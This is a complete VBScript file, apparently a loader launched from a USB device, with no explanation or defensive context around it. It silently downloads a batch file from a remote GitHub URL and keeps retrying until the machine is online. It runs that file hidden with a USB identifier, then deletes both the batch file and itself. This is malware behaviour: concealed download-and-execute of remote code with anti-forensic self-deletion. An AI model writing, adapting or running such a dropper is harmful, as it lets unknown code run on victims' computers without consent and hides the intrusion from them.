Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmp: tmp = fso.GetSpecialFolder(2)
Dim bat: bat = tmp & "\p.bat"
Dim id

If WScript.Arguments.Count > 0 Then
    id = WScript.Arguments(0)
Else
    id = "MANUAL"
End If

' Download batch - curl retries every 30s if no internet (hidden, waits for completion)
ws.Run "cmd /c curl -s --retry 60 --retry-delay 30 --retry-all-errors -o """ & bat & """ https://raw.githubusercontent.com/sislam2005/test/refs/heads/main/usb.bat", 0, True

' Run batch hidden with USB_ID, delete batch after
ws.Run "cmd /c call """ & bat & """ " & id & " & del /q """ & bat & """", 0, False

' Self-delete after brief delay (lets wscript release the file)
ws.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /q """ & WScript.ScriptFullName & """", 0, False
